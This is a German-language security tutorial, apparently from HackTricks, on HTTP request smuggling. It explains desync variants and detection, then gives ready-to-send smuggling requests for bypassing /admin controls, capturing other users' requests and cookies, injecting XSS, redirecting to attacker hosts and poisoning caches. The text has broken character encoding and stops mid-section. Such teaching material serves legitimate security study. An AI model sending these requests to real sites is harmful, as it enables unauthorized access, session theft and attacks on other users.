# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Was ist

Diese Schwachstelle tritt auf, wenn eine **Desynchronisation** zwischen **Front-End-Proxys** und dem **Back-End**-Server es einem **Angreifer** erm√∂glicht, eine HTTP **Anfrage** zu **senden**, die von den **Front-End**-Proxys (Lastenausgleich/Reverse-Proxy) als **eine Anfrage** und vom **Back-End**-Server als **2 Anfragen** **interpretiert** wird.\
Dies erm√∂glicht es einem Benutzer, die n√§chste Anfrage, die beim Back-End-Server nach seiner ankommt, **zu modifizieren**.

### Theorie

[**RFC-Spezifikation (2161)**](https://tools.ietf.org/html/rfc2616)

> Wenn eine Nachricht mit sowohl einem Transfer-Encoding-Headerfeld als auch einem Content-Length-Headerfeld empfangen wird, muss letzterer ignoriert werden.

**Content-Length**

> Der Content-Length-Entity-Header gibt die Gr√∂√üe des Entity-Bodys in Bytes an, die an den Empf√§nger gesendet wird.

**Transfer-Encoding: chunked**

> Der Transfer-Encoding-Header gibt die Form der Kodierung an, die verwendet wird, um den Payload-Body sicher an den Benutzer zu √ºbertragen.\
> Chunked bedeutet, dass gro√üe Daten in einer Reihe von Chunks gesendet werden.

### Realit√§t

Das **Front-End** (ein Lastenausgleich / Reverse Proxy) **verarbeitet** den _**Content-Length**_ oder den _**Transfer-Encoding**_ Header und der **Back-End**-Server **verarbeitet den anderen**, was eine **Desynchronisation** zwischen den 2 Systemen verursacht.\
Dies k√∂nnte sehr kritisch sein, da **ein Angreifer in der Lage sein wird, eine Anfrage** an den Reverse-Proxy zu senden, die vom **Back-End**-Server **als 2 verschiedene Anfragen** **interpretiert** wird. Die **Gefahr** dieser Technik liegt darin, dass der **Back-End**-Server die **2. injizierte Anfrage** so **interpretieren wird**, als ob sie **vom n√§chsten Client** kam und die **echte Anfrage** dieses Clients **Teil** der **injizierten Anfrage** sein wird.

### Besonderheiten

Denke daran, dass in HTTP **ein Zeilenumbruchzeichen aus 2 Bytes besteht:**

* **Content-Length**: Dieser Header verwendet eine **dezimale Zahl**, um die **Anzahl** der **Bytes** des **Bodys** der Anfrage anzugeben. Der Body wird erwartet, dass er mit dem letzten Zeichen endet, **ein Zeilenumbruch ist am Ende der Anfrage nicht erforderlich**.
* **Transfer-Encoding:** Dieser Header verwendet im **Body** eine **hexadezimale Zahl**, um die **Anzahl** der **Bytes** des **n√§chsten Chunks** anzugeben. Der **Chunk** muss mit einem **Zeilenumbruch** **enden**, aber dieser Zeilenumbruch **wird nicht** vom L√§ngenindikator **gez√§hlt**. Diese √úbertragungsmethode muss mit einem **Chunk der Gr√∂√üe 0, gefolgt von 2 Zeilenumbr√ºchen** enden: `0`
* **Connection**: Basierend auf meiner Erfahrung wird empfohlen, **`Connection: keep-alive`** bei der ersten Anfrage des Request Smuggling zu verwenden.

## Grundlegende Beispiele

{% hint style="success" %}
Wenn du versuchst, dies mit Burp Suite auszunutzen, **deaktiviere `Update Content-Length` und `Normalize HTTP/1 line endings`** im Repeater, da einige Gadgets Zeilenumbr√ºche, Wagenr√ºckl√§ufe und fehlerhafte Content-Lengths missbrauchen.
{% endhint %}

HTTP-Request-Smuggling-Angriffe werden durch das Senden von mehrdeutigen Anfragen erstellt, die Diskrepanzen in der Art und Weise ausnutzen, wie Front-End- und Back-End-Server die `Content-Length` (CL) und `Transfer-Encoding` (TE) Header interpretieren. Diese Angriffe k√∂nnen in verschiedenen Formen auftreten, haupts√§chlich als **CL.TE**, **TE.CL** und **TE.TE**. Jeder Typ stellt eine einzigartige Kombination dar, wie die Front-End- und Back-End-Server diese Header priorisieren. Die Schwachstellen entstehen, wenn die Server dieselbe Anfrage auf unterschiedliche Weise verarbeiten, was zu unerwarteten und potenziell b√∂sartigen Ergebnissen f√ºhrt.

### Grundlegende Beispiele f√ºr Schwachstelltypen

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE-Schwachstelle (Content-Length wird vom Front-End verwendet, Transfer-Encoding wird vom Back-End verwendet)

* **Front-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Back-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage, bei der der Wert des `Content-Length`-Headers nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmt.
* Der Front-End-Server leitet die gesamte Anfrage an das Back-End weiter, basierend auf dem `Content-Length`-Wert.
* Der Back-End-Server verarbeitet die Anfrage als chunked aufgrund des `Transfer-Encoding: chunked`-Headers und interpretiert die verbleibenden Daten als separate, nachfolgende Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL-Schwachstelle (Transfer-Encoding wird vom Front-End verwendet, Content-Length wird vom Back-End verwendet)

* **Front-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Back-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine chunked Anfrage, bei der die Chunk-Gr√∂√üe (`7b`) und die tats√§chliche Inhaltsl√§nge (`Content-Length: 4`) nicht √ºbereinstimmen.
* Der Front-End-Server, der `Transfer-Encoding` respektiert, leitet die gesamte Anfrage an das Back-End weiter.
* Der Back-End-Server, der `Content-Length` respektiert, verarbeitet nur den ersten Teil der Anfrage (`7b` Bytes) und l√§sst den Rest als Teil einer unbeabsichtigten nachfolgenden Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE-Schwachstelle (Transfer-Encoding wird von beiden verwendet, mit Obfuskation)

* **Server:** Beide unterst√ºtzen `Transfer-Encoding`, aber einer kann durch Obfuskation dazu gebracht werden, es zu ignorieren.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage mit obfuskierten `Transfer-Encoding`-Headern.
* Je nachdem, welcher Server (Front-End oder Back-End) die Obfuskation nicht erkennt, kann eine CL.TE- oder TE.CL-Schwachstelle ausgenutzt werden.
* Der nicht verarbeitete Teil der Anfrage, wie er von einem der Server gesehen wird, wird Teil einer nachfolgenden Anfrage, was zu Smuggling f√ºhrt.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL-Szenario (Content-Length wird sowohl vom Front-End als auch vom Back-End verwendet):**

* Beide Server verarbeiten die Anfrage ausschlie√ülich basierend auf dem `Content-Length`-Header.
* Dieses Szenario f√ºhrt typischerweise nicht zu Smuggling, da es eine √úbereinstimmung in der Art und Weise gibt, wie beide Server die Anfragenl√§nge interpretieren.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normale Anfrage
```

#### **CL != 0-Szenario:**

* Bezieht sich auf Szenarien, in denen der `Content-Length`-Header vorhanden ist und einen Wert ungleich null hat, was darauf hinweist, dass der Anfrage-Body Inhalt hat.
* Es ist entscheidend f√ºr das Verst√§ndnis und die Erstellung von Smuggling-Angriffen, da es beeinflusst, wie Server das Ende einer Anfrage bestimmen.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Nicht leerer Body
```

#### Webserver brechen

Diese Technik ist auch n√ºtzlich in Szenarien, in denen es m√∂glich ist, einen **Webserver zu brechen, w√§hrend die initialen HTTP-Daten gelesen werden**, aber **ohne die Verbindung zu schlie√üen**. Auf diese Weise wird der **Body** der HTTP-Anfrage als die **n√§chste HTTP-Anfrage** betrachtet.

Zum Beispiel, wie in [**diesem Bericht**](https://mizu.re/post/twisty-python) erkl√§rt, war es in Werkzeug m√∂glich, einige **Unicode**-Zeichen zu senden, und es wird den Server **brechen**. Wenn jedoch die HTTP-Verbindung mit dem Header **`Connection: keep-alive`** erstellt wurde, wird der Body der Anfrage nicht gelesen und die Verbindung bleibt offen, sodass der **Body** der Anfrage als die **n√§chste HTTP-Anfrage** behandelt wird.

#### Erzwingen √ºber Hop-by-Hop-Header

Durch den Missbrauch von Hop-by-Hop-Headern k√∂nntest du den Proxy anweisen, den Header Content-Length oder Transfer-Encoding zu **l√∂schen, sodass ein HTTP-Request-Smuggling m√∂glich ist**.
```
Connection: Content-Length
```
For **weitere Informationen zu hop-by-hop-Headern** besuchen Sie:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Finden von HTTP Request Smuggling

Die Identifizierung von HTTP Request Smuggling-Schwachstellen kann oft durch Timing-Techniken erreicht werden, die darauf basieren, wie lange der Server ben√∂tigt, um auf manipulierte Anfragen zu reagieren. Diese Techniken sind besonders n√ºtzlich zur Erkennung von CL.TE- und TE.CL-Schwachstellen. Neben diesen Methoden gibt es weitere Strategien und Tools, die verwendet werden k√∂nnen, um solche Schwachstellen zu finden:

### Finden von CL.TE-Schwachstellen mit Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, falls die Anwendung anf√§llig ist, den Back-End-Server dazu bringt, auf zus√§tzliche Daten zu warten.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Content-Length` und schneidet die Nachricht vorzeitig ab.
* Der Back-End-Server, der eine chunked Nachricht erwartet, wartet auf den n√§chsten Chunk, der nie ankommt, was zu einer Verz√∂gerung f√ºhrt.
* **Indikatoren:**
* Timeouts oder lange Verz√∂gerungen bei der Antwort.
* Erhalt eines 400 Bad Request-Fehlers vom Back-End-Server, manchmal mit detaillierten Serverinformationen.

### Finden von TE.CL-Schwachstellen mit Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, falls die Anwendung anf√§llig ist, den Back-End-Server dazu bringt, auf zus√§tzliche Daten zu warten.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Transfer-Encoding` und leitet die gesamte Nachricht weiter.
* Der Back-End-Server, der eine Nachricht basierend auf `Content-Length` erwartet, wartet auf zus√§tzliche Daten, die nie ankommen, was zu einer Verz√∂gerung f√ºhrt.

### Andere Methoden zur Auffindung von Schwachstellen

* **Differenzielle Antwortanalyse:**
* Senden Sie leicht variierte Versionen einer Anfrage und beobachten Sie, ob die Serverantworten auf unerwartete Weise abweichen, was auf eine Parsing-Diskrepanz hinweist.
* **Verwendung automatisierter Tools:**
* Tools wie die 'HTTP Request Smuggler'-Erweiterung von Burp Suite k√∂nnen automatisch auf diese Schwachstellen testen, indem sie verschiedene Formen von mehrdeutigen Anfragen senden und die Antworten analysieren.
* **Content-Length-Varianztests:**
* Senden Sie Anfragen mit variierenden `Content-Length`-Werten, die nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmen, und beobachten Sie, wie der Server mit solchen Abweichungen umgeht.
* **Transfer-Encoding-Varianztests:**
* Senden Sie Anfragen mit obfuskierten oder fehlerhaften `Transfer-Encoding`-Headern und √ºberwachen Sie, wie unterschiedlich die Front-End- und Back-End-Server auf solche Manipulationen reagieren.

### Testen von HTTP Request Smuggling-Schwachstellen

Nachdem die Wirksamkeit von Timing-Techniken best√§tigt wurde, ist es entscheidend zu √ºberpr√ºfen, ob Client-Anfragen manipuliert werden k√∂nnen. Eine einfache Methode besteht darin, zu versuchen, Ihre Anfragen zu vergiften, zum Beispiel indem Sie eine Anfrage an `/` senden, die eine 404-Antwort zur√ºckgibt. Die zuvor besprochenen `CL.TE`- und `TE.CL`-Beispiele in [Grundlegende Beispiele](./#basic-examples) zeigen, wie man eine Client-Anfrage vergiftet, um eine 404-Antwort zu erhalten, obwohl der Client auf eine andere Ressource zugreifen m√∂chte.

**Wichtige √úberlegungen**

Beim Testen auf Request Smuggling-Schwachstellen durch St√∂rung anderer Anfragen sollten Sie Folgendes beachten:

* **Getrennte Netzwerkverbindungen:** Die "Angriffs"- und "normalen" Anfragen sollten √ºber separate Netzwerkverbindungen gesendet werden. Die Verwendung derselben Verbindung f√ºr beide validiert nicht das Vorhandensein der Schwachstelle.
* **Konsistente URL und Parameter:** Versuchen Sie, identische URLs und Parameternamen f√ºr beide Anfragen zu verwenden. Moderne Anwendungen leiten Anfragen oft an spezifische Back-End-Server basierend auf URL und Parametern weiter. Das Abgleichen dieser erh√∂ht die Wahrscheinlichkeit, dass beide Anfragen vom selben Server verarbeitet werden, was eine Voraussetzung f√ºr einen erfolgreichen Angriff ist.
* **Timing- und Rennbedingungen:** Die "normale" Anfrage, die dazu dient, St√∂rungen durch die "Angriffs"-Anfrage zu erkennen, konkurriert mit anderen gleichzeitigen Anwendungsanfragen. Daher sollte die "normale" Anfrage sofort nach der "Angriffs"-Anfrage gesendet werden. Besch√§ftigte Anwendungen k√∂nnen mehrere Versuche erfordern, um eine schl√ºssige Best√§tigung der Schwachstelle zu erhalten.
* **Herausforderungen beim Lastenausgleich:** Front-End-Server, die als Lastenausgleicher fungieren, k√∂nnen Anfragen auf verschiedene Back-End-Systeme verteilen. Wenn die "Angriffs"- und "normalen" Anfragen auf unterschiedlichen Systemen landen, wird der Angriff nicht erfolgreich sein. Dieser Aspekt des Lastenausgleichs kann mehrere Versuche erfordern, um eine Schwachstelle zu best√§tigen.
* **Unbeabsichtigte Auswirkungen auf Benutzer:** Wenn Ihr Angriff versehentlich die Anfrage eines anderen Benutzers beeinflusst (nicht die "normale" Anfrage, die Sie zur Erkennung gesendet haben), deutet dies darauf hin, dass Ihr Angriff einen anderen Anwendungsbenutzer beeinflusst hat. Kontinuierliches Testen k√∂nnte andere Benutzer st√∂ren, was einen vorsichtigen Ansatz erfordert.

## Missbrauch von HTTP Request Smuggling

### Umgehung der Front-End-Sicherheit √ºber HTTP Request Smuggling

Manchmal setzen Front-End-Proxys Sicherheitsma√ünahmen durch, die eingehende Anfragen √ºberpr√ºfen. Diese Ma√ünahmen k√∂nnen jedoch umgangen werden, indem HTTP Request Smuggling ausgenutzt wird, was unbefugten Zugriff auf eingeschr√§nkte Endpunkte erm√∂glicht. Zum Beispiel k√∂nnte der Zugriff auf `/admin` extern verboten sein, wobei der Front-End-Proxy solche Versuche aktiv blockiert. Dennoch k√∂nnte dieser Proxy es vers√§umen, eingebettete Anfragen innerhalb einer geschmuggelten HTTP-Anfrage zu √ºberpr√ºfen, was eine L√ºcke zum Umgehen dieser Einschr√§nkungen l√§sst.

Betrachten Sie die folgenden Beispiele, die veranschaulichen, wie HTTP Request Smuggling verwendet werden kann, um Front-End-Sicherheitskontrollen zu umgehen, insbesondere den `/admin`-Pfad, der typischerweise durch den Front-End-Proxy gesch√ºtzt ist:

**CL.TE Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Im CL.TE-Angriff wird der `Content-Length`-Header f√ºr die urspr√ºngliche Anfrage verwendet, w√§hrend die nachfolgende eingebettete Anfrage den `Transfer-Encoding: chunked`-Header nutzt. Der Front-End-Proxy verarbeitet die urspr√ºngliche `POST`-Anfrage, √ºbersieht jedoch die eingebettete `GET /admin`-Anfrage, was unbefugten Zugriff auf den `/admin`-Pfad erm√∂glicht.

**TE.CL Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Im Gegensatz dazu verwendet der TE.CL-Angriff die anf√§ngliche `POST`-Anfrage mit `Transfer-Encoding: chunked`, und die nachfolgende eingebettete Anfrage wird basierend auf dem `Content-Length`-Header verarbeitet. √Ñhnlich wie beim CL.TE-Angriff √ºbersieht der Front-End-Proxy die geschmuggelte `GET /admin`-Anfrage und gew√§hrt versehentlich Zugriff auf den eingeschr√§nkten `/admin`-Pfad.

### Offenlegung der Front-End-Anforderungsumformung <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Anwendungen verwenden h√§ufig einen **Front-End-Server**, um eingehende Anfragen zu √§ndern, bevor sie an den Back-End-Server weitergeleitet werden. Eine typische √Ñnderung besteht darin, Header hinzuzuf√ºgen, wie z.B. `X-Forwarded-For: <IP des Clients>`, um die IP des Clients an das Back-End weiterzuleiten. Das Verst√§ndnis dieser √Ñnderungen kann entscheidend sein, da es M√∂glichkeiten aufdecken k√∂nnte, **Schutzma√ünahmen zu umgehen** oder **verborgene Informationen oder Endpunkte aufzudecken**.

Um zu untersuchen, wie ein Proxy eine Anfrage √§ndert, finden Sie einen POST-Parameter, den das Back-End in der Antwort zur√ºckgibt. Erstellen Sie dann eine Anfrage, bei der dieser Parameter zuletzt verwendet wird, √§hnlich wie im Folgenden:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In dieser Struktur werden die nachfolgenden Anfragekomponenten nach `search=` angeh√§ngt, was der Parameter ist, der in der Antwort reflektiert wird. Diese Reflexion wird die Header der nachfolgenden Anfrage offenlegen.

Es ist wichtig, den `Content-Length`-Header der geschachtelten Anfrage mit der tats√§chlichen Inhaltsl√§nge abzugleichen. Es ist ratsam, mit einem kleinen Wert zu beginnen und schrittweise zu erh√∂hen, da ein zu niedriger Wert die reflektierten Daten abschneiden kann, w√§hrend ein zu hoher Wert dazu f√ºhren kann, dass die Anfrage fehlschl√§gt.

Diese Technik ist auch im Kontext einer TE.CL-Schwachstelle anwendbar, aber die Anfrage sollte mit `search=\r\n0` enden. Unabh√§ngig von den Zeilenumbruchzeichen werden die Werte an den Suchparameter angeh√§ngt.

Diese Methode dient haupts√§chlich dazu, die von dem Front-End-Proxy vorgenommenen Anfrage√§nderungen zu verstehen, indem sie im Wesentlichen eine selbstgesteuerte Untersuchung durchf√ºhrt.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es ist m√∂glich, die Anfragen des n√§chsten Benutzers zu erfassen, indem man eine spezifische Anfrage als Wert eines Parameters w√§hrend einer POST-Operation anh√§ngt. So kann dies erreicht werden:

Indem man die folgende Anfrage als Wert eines Parameters anh√§ngt, kann man die Anfrage des nachfolgenden Clients speichern:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In diesem Szenario ist der **Kommentarparameter** dazu gedacht, die Inhalte im Kommentarbereich eines Beitrags auf einer √∂ffentlich zug√§nglichen Seite zu speichern. Folglich werden die Inhalte der nachfolgenden Anfrage als Kommentar angezeigt.

Diese Technik hat jedoch Einschr√§nkungen. Im Allgemeinen erfasst sie Daten nur bis zum Parameter-Trennzeichen, das in der geschmuggelten Anfrage verwendet wird. Bei URL-kodierten Formular√ºbertragungen ist dieses Trennzeichen das `&`-Zeichen. Das bedeutet, dass der erfasste Inhalt aus der Anfrage des Opfers beim ersten `&` stoppt, das m√∂glicherweise sogar Teil der Abfragezeichenfolge ist.

Dar√ºber hinaus ist es erw√§hnenswert, dass dieser Ansatz auch bei einer TE.CL-Schwachstelle umsetzbar ist. In solchen F√§llen sollte die Anfrage mit `search=\r\n0` enden. Unabh√§ngig von Zeilenumbruchzeichen werden die Werte an den Suchparameter angeh√§ngt.

### Verwendung von HTTP-Request-Smuggling zur Ausnutzung von reflektiertem XSS

HTTP Request Smuggling kann genutzt werden, um Webseiten auszunutzen, die anf√§llig f√ºr **reflektiertes XSS** sind, und bietet erhebliche Vorteile:

* Interaktion mit den Zielbenutzern ist **nicht erforderlich**.
* Erm√∂glicht die Ausnutzung von XSS in Teilen der Anfrage, die **normalerweise unerreichbar** sind, wie HTTP-Anforderungsheader.

In Szenarien, in denen eine Website anf√§llig f√ºr reflektiertes XSS √ºber den User-Agent-Header ist, zeigt die folgende Payload, wie man diese Schwachstelle ausnutzen kann:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Dieses Payload ist so strukturiert, dass es die Schwachstelle ausnutzt, indem es:

1. Eine `POST`-Anfrage initiiert, die scheinbar typisch ist, mit einem `Transfer-Encoding: chunked`-Header, um den Beginn des Smuggelns anzuzeigen.
2. Darauf folgt eine `0`, die das Ende des chunked Nachrichtentextes markiert.
3. Dann wird eine geschmuggelte `GET`-Anfrage eingef√ºhrt, bei der der `User-Agent`-Header mit einem Skript, `<script>alert(1)</script>`, injiziert wird, was die XSS ausl√∂st, wenn der Server diese nachfolgende Anfrage verarbeitet.

Durch die Manipulation des `User-Agent` durch Smuggling umgeht das Payload die normalen Anfragebeschr√§nkungen und nutzt somit die Reflected XSS-Schwachstelle auf eine nicht standardm√§√üige, aber effektive Weise aus.

#### HTTP/0.9

{% hint style="danger" %}
Falls der Benutzerinhalt in einer Antwort mit einem **`Content-type`** wie **`text/plain`** widergespiegelt wird, wird die Ausf√ºhrung der XSS verhindert. Wenn der Server **HTTP/0.9** unterst√ºtzt, k√∂nnte es m√∂glich sein, dies zu umgehen!
{% endhint %}

Die Version HTTP/0.9 war zuvor zu 1.0 und verwendet nur **GET**-Verben und **antwortet nicht** mit **Headers**, nur mit dem Body.

In [**diesem Bericht**](https://mizu.re/post/twisty-python) wurde dies mit einem Request Smuggling und einem **anf√§lligen Endpunkt, der mit der Eingabe des Benutzers antwortet**, ausgenutzt, um eine Anfrage mit HTTP/0.9 zu schmuggeln. Der Parameter, der in der Antwort widergespiegelt wird, enthielt eine **falsche HTTP/1.1-Antwort (mit Headers und Body)**, sodass die Antwort g√ºltigen ausf√ºhrbaren JS-Code mit einem `Content-Type` von `text/html` enth√§lt.

### Ausnutzen von On-Site-Redirects mit HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Anwendungen leiten oft von einer URL zu einer anderen um, indem sie den Hostnamen aus dem `Host`-Header in der Umleitungs-URL verwenden. Dies ist bei Webservern wie Apache und IIS √ºblich. Zum Beispiel f√ºhrt die Anforderung eines Ordners ohne abschlie√üenden Schr√§gstrich zu einer Umleitung, um den Schr√§gstrich einzuschlie√üen:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Obwohl scheinbar harmlos, kann dieses Verhalten mithilfe von HTTP-Request-Smuggling manipuliert werden, um Benutzer auf eine externe Seite umzuleiten. Zum Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Diese geschmuggelte Anfrage k√∂nnte dazu f√ºhren, dass die n√§chste verarbeitete Benutzeranfrage auf eine von einem Angreifer kontrollierte Website umgeleitet wird:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In diesem Szenario wird die Anfrage eines Benutzers nach einer JavaScript-Datei hijacked. Der Angreifer kann potenziell den Benutzer kompromittieren, indem er b√∂sartigen JavaScript als Antwort bereitstellt.

### Ausnutzen von Web-Cache-Vergiftung √ºber HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web-Cache-Vergiftung kann ausgef√ºhrt werden, wenn irgendeine Komponente der **Front-End-Infrastruktur Inhalte cached**, typischerweise um die Leistung zu verbessern. Durch Manipulation der Serverantwort ist es m√∂glich, den **Cache zu vergiften**.

Zuvor haben wir beobachtet, wie Serverantworten ge√§ndert werden konnten, um einen 404-Fehler zur√ºckzugeben (siehe [Grundlegende Beispiele](./#basic-examples)). √Ñhnlich ist es m√∂glich, den Server dazu zu bringen, den Inhalt von `/index.html` als Antwort auf eine Anfrage nach `/static/include.js` zu liefern. Folglich wird der Inhalt von `/static/include.js` im Cache durch den von `/index.html` ersetzt, wodurch `/static/include.js` f√ºr Benutzer unzug√§nglich wird, was potenziell zu einem Denial of Service (DoS) f√ºhren kann.

Diese Technik wird besonders m√§chtig, wenn eine **Open Redirect-Schwachstelle** entdeckt wird oder wenn es eine **Vor-Ort-Weiterleitung zu einer offenen Weiterleitung** gibt. Solche Schwachstellen k√∂nnen ausgenutzt werden, um den zwischengespeicherten Inhalt von `/static/include.js` durch ein Skript unter der Kontrolle des Angreifers zu ersetzen, was im Wesentlichen einen weitreichenden Cross-Site Scripting (XSS)-Angriff gegen alle Clients erm√∂glicht, die das aktualisierte `/static/include.js` anfordern.

Nachfolgend ist eine Illustration des Ausnutzens von **Cache-Vergiftung kombiniert mit einer Vor-Ort-Weiterleitung zu einer offenen Weiterleitung**. Das Ziel ist es, den Cache-Inhalt von `/static/include.js` zu √§ndern, um JavaScript-Code bereitzustellen, der vom Angreifer kontrolliert wird:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Beachten Sie die eingebettete Anfrage, die auf `/post/next?postId=3` abzielt. Diese Anfrage wird auf `/post?postId=4` umgeleitet, wobei der **Host-Header-Wert** verwendet wird, um die Domain zu bestimmen. Durch die √Ñnderung des **Host-Headers** kann der Angreifer die Anfrage auf seine Domain umleiten (**on-site redirect to open redirect**).

Nach erfolgreicher **Socket-Poisoning** sollte eine **GET-Anfrage** f√ºr `/static/include.js` initiiert werden. Diese Anfrage wird durch die vorherige **on-site redirect to open redirect**-Anfrage kontaminiert und ruft den Inhalt des vom Angreifer kontrollierten Skripts ab.

Anschlie√üend wird jede Anfrage f√ºr `/static/include.js` den zwischengespeicherten Inhalt des Skripts des Angreifers bereitstellen, was effektiv einen umfassenden XSS-Angriff ausl√∂st.

### Verwendung von HTTP-Request-Smuggling zur Durchf√ºhrung von Web-Cache- T√§uschung <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Was ist der Unterschied zwischen Web-Cache-Poisoning und Web-Cache-T√§uschung?**
>
